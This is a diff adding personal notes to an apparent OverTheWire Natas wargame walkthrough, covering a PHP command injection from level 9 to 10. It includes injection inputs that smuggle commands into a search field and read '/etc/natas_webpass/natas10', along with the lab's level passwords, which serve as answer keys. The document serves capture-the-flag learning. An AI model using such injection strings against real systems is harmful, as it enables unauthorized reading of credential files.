@@ -97,3 +97,14 @@ echo(base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362'))));
 // Result: oubWYf2kBq
 // Adding it in the input we obtain : 
 W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+lvl 9 --> lvl 10
+http://natas9.natas.labs.overthewire.org/
+natas9
+W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+// The point of this level is to proceed a PHP command injection
+a /dev/null; # // checks all the files in the folder
+// ; # allows to end the request and not get the whole dictionnary.txt back
+. /etc/natas_webpass/natas10 #
+// note a . with a space '. ' allows to espace and look for other files
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
